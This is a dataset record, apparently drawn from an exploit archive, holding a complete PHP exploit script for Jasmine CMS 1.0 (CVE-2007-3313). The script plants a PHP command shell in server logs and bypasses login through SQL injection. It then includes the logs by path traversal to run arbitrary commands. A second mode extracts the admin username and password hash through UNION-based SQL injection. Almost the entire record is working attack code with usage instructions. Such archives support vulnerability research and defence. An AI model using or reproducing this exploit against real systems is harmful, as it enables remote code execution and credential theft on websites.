{
  "id": "4081",
  "title": "Jasmine CMS 1.0 - SQL Injection / Remote Code Execution",
  "cve": "CVE-2007-3313",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/php -q -d short_open_tag=on\r\n<?php\r\n\r\nerror_reporting(0);\r\nini_set(\"max_execution_time\",0);\r\nini_set(\"default_socket_timeout\",5);\r\n\r\nif ($argc<4) {\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nprint \"        Jasmine CMS 1.0 SQL Injection/Remote Code Execution Exploit\\r\\n\";\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nprint \"Usage: w4ck1ng_jasmine.php [OPTION] [HOST] [PATH] ([COMMAND])\\r\\n\\r\\n\";\r\nprint \"[OPTION]  = 0 = Remote Code Execution\\r\\n\";\r\nprint \"            1 = SQL Injection (Admin user & hash retrieval)\\r\\n\";\r\nprint \"[HOST] \t  = Target server's hostname or ip address\\r\\n\";\r\nprint \"[PATH] \t  = Path where Jasmine is located\\r\\n\";\r\nprint \"[COMMAND] = Command to execute\\r\\n\\r\\n\";\r\nprint \"e.g. w4ck1ng_jasmine.php 0 victim.com /jasmine/ \\\"ls -lia\\\"\\r\\n\";\r\nprint \"     w4ck1ng_jasmine.php 1 victim.com /jasmine/\\r\\n\";\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nprint \"            \t\t http://www.w4ck1ng.com\\r\\n\";\r\nprint \"            \t\t        ...Silentz\\r\\n\";\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\ndie;\r\n}\r\n\r\n//Props to rgod for the following functions\r\n\r\n$proxy_regex = '(\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\:\\d{1,5}\\b)';\r\nfunction sendpacketii($packet)\r\n{\r\n  global $proxy, $host, $port, $html, $proxy_regex;\r\n  if ($proxy=='') {\r\n    $ock=fsockopen(gethostbyname($host),$port);\r\n    if (!$ock) {\r\n      echo 'No response from '.$host.':'.$port; die;\r\n    }\r\n  }\r\n  else {\r\n\t$c = preg_match($proxy_regex,$proxy);\r\n    if (!$c) {\r\n      echo 'Not a valid proxy...';die;\r\n    }\r\n    $parts=explode(':',$proxy);\r\n    echo \"Connecting to \".$parts[0].\":\".$parts[1].\" proxy...\\r\\n\";\r\n    $ock=fsockopen($parts[0],$parts[1]);\r\n    if (!$ock) {\r\n      echo 'No response from proxy...';die;\r\n\t}\r\n  }\r\n  fputs($ock,$packet);\r\n  if ($proxy=='') {\r\n    $html='';\r\n    while (!feof($ock)) {\r\n      $html.=fgets($ock);\r\n    }\r\n  }\r\n  else {\r\n    $html='';\r\n    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {\r\n      $html.=fread($ock,1);\r\n    }\r\n  }\r\n  fclose($ock);\r\n}\r\n\r\nfunction make_seed()\r\n{\r\n   list($usec, $sec) = explode(' ', microtime());\r\n   return (float) $sec + ((float) $usec * 100000);\r\n}\r\n\r\n$exploit = $argv[1];\r\n$host = $argv[2];\r\n$path = $argv[3];\r\n$cmd  = $argv[4];\r\n$cmd  = urlencode($cmd);\r\n$port=80;\r\n$proxy=\"\";\r\n\r\nif (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}\r\nif ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}\r\n\r\nfunction head(){\r\n\r\n\tprint \"-------------------------------------------------------------------------\\r\\n\";\r\n\tprint \"        Jasmine CMS 1.0 SQL Injection/Remote Code Execution Exploit\\r\\n\";\r\n\tprint \"-------------------------------------------------------------------------\\r\\n\";\r\n}\r\n\r\nfunction footer(){\r\n\r\n\tprint \"-------------------------------------------------------------------------\\r\\n\";\r\n\tprint \"            \t\t http://www.w4ck1ng.com\\r\\n\";\r\n\tprint \"            \t\t        ...Silentz\\r\\n\";\r\n\tprint \"-------------------------------------------------------------------------\\r\\n\";\r\n}\r\n\r\n\r\nif ($exploit==0){\r\n\r\nhead();\r\n\r\n$code=\"<?php echo w4ckw4ck;error_reporting(0);set_time_limit(0);if (get_magic_quotes_gpc()){\\$_GET[cmd]=stripslashes(\\$_GET[cmd]);}passthru(\\$_GET[cmd]);die;?>\";\r\n$packet=\"GET \" . $p . $code . \" HTTP/1.0\\r\\n\";\r\n$packet.=\"User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\\r\\n\";\r\n$packet.=\"Host: \" . $host . \"\\r\\n\";\r\n$packet.=\"Connection: close\\r\\n\\r\\n\";\r\nsendpacketii($packet);\r\n\r\n$sql = \"' UNION SELECT id,username,email,signature,avatar_path,joined,total_visits,status FROM user WHERE id = '1'/*\";\r\n\r\n$data=\"login_username=\" . $sql;\r\n$data.=\"&login_password=\";\r\n$data.=\"login=Login\";\r\n$packet =\"POST \" . $path . \"login.php HTTP/1.1\\r\\n\";\r\n$packet.=\"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"User-Agent: Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727;)\\r\\n\";\r\n$packet.=\"Content-Length: \".strlen($data).\"\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n$packet.=$data;\r\nsendpacketii($packet);\r\n\r\nif (strstr($html,\"302 Found\")){}\r\nelse{print \"[-] Exploit Failed...\\r\\n\"; footer(); exit();}\r\n$temp=explode(\"Set-Cookie: \",$html);\r\n$temp2=explode(\" \",$temp[1]);\r\n$cookie=$temp2[0];\r\n\r\n$paths= array (\r\n\"../../../../../var/log/httpd/access_log\",\r\n\"../../../../../var/log/httpd/error_log\",\r\n\"../apache/logs/error.log\",\r\n\"../apache/logs/access.log\",\r\n\"../../apache/logs/error.log\",\r\n\"../../apache/logs/access.log\",\r\n\"../../../apache/logs/error.log\",\r\n\"../../../apache/logs/access.log\",\r\n\"../../../../apache/logs/error.log\",\r\n\"../../../../apache/logs/access.log\",\r\n\"../../../../../apache/logs/error.log\",\r\n\"../../../../../apache/logs/access.log\",\r\n\"../logs/error.log\",\r\n\"../logs/access.log\",\r\n\"../../logs/error.log\",\r\n\"../../logs/access.log\",\r\n\"../../../logs/error.log\",\r\n\"../../../logs/access.log\",\r\n\"../../../../logs/error.log\",\r\n\"../../../../logs/access.log\",\r\n\"../../../../../logs/error.log\",\r\n\"../../../../../logs/access.log\",\r\n\"../../../../../etc/httpd/logs/access_log\",\r\n\"../../../../../etc/httpd/logs/access.log\",\r\n\"../../../../../etc/httpd/logs/error_log\",\r\n\"../../../../../etc/httpd/logs/error.log\",\r\n\"../../../../../var/www/logs/access_log\",\r\n\"../../../../../var/www/logs/access.log\",\r\n\"../../../../../usr/local/apache/logs/access_log\",\r\n\"../../../../../usr/local/apache/logs/access.log\",\r\n\"../../../../../var/log/apache/access_log\",\r\n\"../../../../../var/log/apache/access.log\",\r\n\"../../../../../var/log/access_log\",\r\n\"../../../../../var/www/logs/error_log\",\r\n\"../../../../../var/www/logs/error.log\",\r\n\"../../../../../usr/local/apache/logs/error_log\",\r\n\"../../../../../usr/local/apache/logs/error.log\",\r\n\"../../../../../var/log/apache/error_log\",\r\n\"../../../../../var/log/apache/error.log\",\r\n\"../../../../../var/log/access_log\",\r\n\"../../../../../var/log/error_log\"\r\n);\r\n\r\nfor ($i=0; $i<=count($paths)-1; $i++)\r\n{\r\n$a=$i+2;\r\n\r\n$packet =\"GET \" . $path . \"admin/plugin_manager.php?u=\" . $paths[$i] . \"%00&cmd=\" . $cmd . \" HTTP/1.1\\r\\n\";\r\n$packet.=\"Host: \" . $host . \"\\r\\n\"; \r\n$packet.=\"Cookie: \" . $cookie . \"\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n\r\nsendpacketii($packet);\r\n\r\nif (strstr($html,\"w4ckw4ck\"))\r\n    {\r\n     $temp=explode(\"w4ckw4ck\",$html);\r\n        print $temp[1];\r\n        footer(); exit;\r\n    }\r\n  }\r\n}\r\n\r\nif($exploit==1){\r\n\r\n    $sql = \"news.php?item=-999/**/UNION/**/SELECT/**/0,password,0,0,0,0,username/**/FROM/**/user/**/WHERE/**/id=1/*\";\r\n    $packet =\"GET \" . $path . $sql . \" HTTP/1.1\\r\\n\";\r\n    $packet.=\"Host: \" . $host . \"\\r\\n\";\r\n    $packet.=\"User-Agent: Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727;)\\r\\n\";\r\n    $packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n    sendpacketii($packet);\r\n\r\n    $temp = explode(\"Posted by \",$html);\r\n    $temp2 = explode(\"at \",$temp[1]);\r\n    $username = $temp2[0];\r\n\r\n    $temp = explode(\"<td class='main_table_title'>\",$html);\r\n    $temp2 = explode(\"</td>\",$temp[1]);\r\n    $password = $temp2[0];\r\n\r\n    if($username && $password){\r\n\t\r\n\thead();\r\n\tprint \"[+] Admin User: \" . $username . \"\\r\\n\";\r\n    \tprint \"[+] Admin Hash: \" . $password . \"\\r\\n\";\r\n\tfooter();\r\n\r\n    }\r\n\r\n\telse{head(); print \"[-] Exploit Failed...\\r\\n\"; footer();}\r\n}\r\n?>\r\n\r\n# milw0rm.com [2007-06-19]",
  "url": "https://www.exploit-db.com/exploits/4081"
}